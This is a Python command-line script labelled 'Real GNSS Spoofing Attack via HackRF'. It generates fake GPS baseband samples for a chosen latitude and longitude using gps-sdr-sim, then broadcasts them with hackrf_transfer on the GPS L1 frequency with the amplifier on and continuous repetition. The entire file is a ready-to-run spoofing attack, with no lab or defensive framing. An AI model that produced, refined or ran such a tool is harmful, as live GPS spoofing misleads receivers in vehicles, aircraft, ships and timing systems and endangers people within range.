import os
import subprocess
import argparse
import random
import time

GPS_SDR_SIM_BINARY = "./gps-sdr-sim"
SPOOF_FILE = "gps_spoof_signal.bin"

def generate_gps_iq(lat, lon, duration, jitter):
    jittered_lat = float(lat) + random.uniform(-jitter, jitter)
    jittered_lon = float(lon) + random.uniform(-jitter, jitter)

    command = [
        GPS_SDR_SIM_BINARY,
        "-e", "brdc.n",             # GPS navigation file (must exist or downloaded from NASA)
        "-l", f"{jittered_lat},{jittered_lon},100",  # lat,lon,altitude
        "-d", str(duration),        # duration (seconds)
        "-o", SPOOF_FILE            # output IQ file
    ]

    print(f"[+] Generating IQ samples for {jittered_lat:.5f}, {jittered_lon:.5f}")
    subprocess.run(command, check=True)

def transmit_spoof_signal(sample_rate, frequency, gain):
    command = [
        "hackrf_transfer",
        "-t", SPOOF_FILE,
        "-f", str(frequency),
        "-s", str(sample_rate),
        "-x", str(gain),
        "-a", "1",  # Amplifier ON for strong signal
        "-R"        # Repeat continuously
    ]

    print(f"[+] Transmitting spoofed GPS signal at {frequency/1e6} MHz...")
    subprocess.run(command)

def cleanup():
    if os.path.exists(SPOOF_FILE):
        os.remove(SPOOF_FILE)
        print("[+] Cleaned temporary spoof IQ file.")

def main():
    parser = argparse.ArgumentParser(description="Real GNSS Spoofing Attack via HackRF")
    parser.add_argument("--lat", required=True, help="Latitude to spoof")
    parser.add_argument("--lon", required=True, help="Longitude to spoof")
    parser.add_argument("--duration", type=int, default=300, help="IQ file duration (seconds)")
    parser.add_argument("--sample-rate", type=int, default=2600000, help="Sample rate (default: 2.6 MHz)")
    parser.add_argument("--frequency", type=int, default=1575420000, help="GPS L1 frequency (default: 1575.42 MHz)")
    parser.add_argument("--gain", type=int, default=40, help="TX Gain (0-47, default: 40)")
    parser.add_argument("--jitter", type=float, default=0.0001, help="Coordinate jitter amount")

    args = parser.parse_args()

    try:
        if not os.path.exists(GPS_SDR_SIM_BINARY):
            print(f"[!] {GPS_SDR_SIM_BINARY} not found. Download gps-sdr-sim and compile first.")
            exit(1)

        generate_gps_iq(args.lat, args.lon, args.duration, args.jitter)
        transmit_spoof_signal(args.sample_rate, args.frequency, args.gain)

    except KeyboardInterrupt:
        print("\n[+] GNSS spoof transmission stopped.")

    except subprocess.CalledProcessError as e:
        print(f"[!] Command failed: {e}")

    finally:
        cleanup()

if __name__ == "__main__":
    main()
